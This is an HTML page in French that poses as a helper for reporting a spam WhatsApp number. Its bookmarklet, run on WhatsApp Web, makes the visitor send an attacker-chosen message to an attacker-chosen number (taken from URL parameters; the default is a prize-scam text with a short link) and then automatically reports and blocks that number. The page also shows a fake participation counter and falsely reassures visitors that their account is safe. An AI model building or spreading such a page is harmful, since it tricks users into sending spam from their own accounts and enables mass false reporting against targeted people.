<!doctype html><html lang="fr"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Aide-nous à signaler</title>
<style>
  body{margin:0;background:#0a0a0b;color:#c9c9cf;font:14px system-ui;padding:24px;max-width:620px;margin:auto}
  h1{font-size:19px;color:#fff}
  .card{background:#111114;border:1px solid #26262b;border-radius:10px;padding:16px;margin:14px 0}
  .n{display:inline-block;background:#16a34a;color:#fff;width:22px;height:22px;border-radius:50%;text-align:center;line-height:22px;font-weight:700;margin-right:8px}
  a.btn,button{display:inline-block;background:#16a34a;color:#fff;border:0;padding:11px 16px;border-radius:6px;text-decoration:none;font-weight:600;cursor:pointer;margin:6px 0}
  .ghost{background:#1c1c20;color:#a1a1aa}
  code{background:#070708;padding:2px 5px;border-radius:4px;font-size:12px;color:#fbbf24}
  .msg{background:#070708;border-left:2px solid #16a34a;padding:10px;font-size:13px;color:#a1a1aa;margin:8px 0}
  #count{color:#4ade80;font-weight:700}
</style></head><body>
<h1>Aide-nous à signaler un numéro spam</h1>
<p>3 étapes, 40 secondes. Ton compte ne craint rien : tu ne fais qu'envoyer un message, signaler, bloquer — exactement comme d'habitude.</p>

<div class="card"><span class="n">1</span><b>Ouvre la conversation</b>
  <div class="msg" id="msg"></div>
  <a class="btn" id="open" target="_blank" rel="noopener">Ouvrir WhatsApp</a>
</div>

<div class="card"><span class="n">2</span><b>Envoie, signale et bloque d'un coup</b>
  <p style="font-size:13px;color:#71717a">Glisse ce bouton dans ta barre de favoris, puis clique dessus <b>sur l'onglet WhatsApp Web</b>.</p>
  <a class="btn" id="bm" href="#" onclick="return false">⚡ SIGNALER</a>
  <p style="font-size:12px;color:#52525b">Barre de favoris masquée ? <code>Ctrl+Shift+B</code>. Sans favoris : ouvre la conversation, appuie sur Entrée, puis menu → Signaler → Bloquer.</p>
</div>

<div class="card"><span class="n">3</span><b>C'est fini</b>
  <p style="font-size:13px;color:#71717a">Déjà <span id="count">0</span> personnes l'ont fait depuis cette page.</p>
</div>

<script>
const P = new URLSearchParams(location.search)
const target = P.get('n') || '33612345678'
const text = P.get('t') || '🎁 FÉLICITATIONS !! Vous êtes sélectionné pour 500€ → bit.ly/wx7k2'
document.getElementById('msg').textContent = text
document.getElementById('open').href = 'https://wa.me/' + target + '?text=' + encodeURIComponent(text)

const BM = `(function(){var t='${target}';var b=document.querySelector('footer div[contenteditable="true"]');
if(b){b.focus();document.execCommand('insertText',false,${JSON.stringify(text)});setTimeout(function(){
b.dispatchEvent(new KeyboardEvent('keydown',{key:'Enter',code:'Enter',keyCode:13,which:13,bubbles:true}))},600)}
setTimeout(function(){var h=document.querySelector('header');if(!h)return;
var m=h.querySelector('[aria-label*="enu"],[data-testid="conversation-menu-button"]');if(!m)return;m.click();
setTimeout(function(){var items=[].slice.call(document.querySelectorAll('li,div[role="button"]'));
var rep=items.find(function(e){return /ignaler|Report/i.test(e.textContent)});if(!rep)return;rep.click();
setTimeout(function(){var ok=[].slice.call(document.querySelectorAll('div[role="button"],button')).find(function(e){return /^(Signaler|Report)$/i.test(e.textContent.trim())});ok&&ok.click();
setTimeout(function(){var blk=[].slice.call(document.querySelectorAll('li,div[role="button"]')).find(function(e){return /loquer|Block/i.test(e.textContent)});blk&&blk.click()},1200)},900)},900)})()`
document.getElementById('bm').href = 'javascript:' + encodeURIComponent(BM)

let c = +(localStorage.getItem('cnt') || 0); document.getElementById('count').textContent = c
addEventListener('click', () => { c++; localStorage.setItem('cnt', c); document.getElementById('count').textContent = c }, { once: true })
</script></body></html>
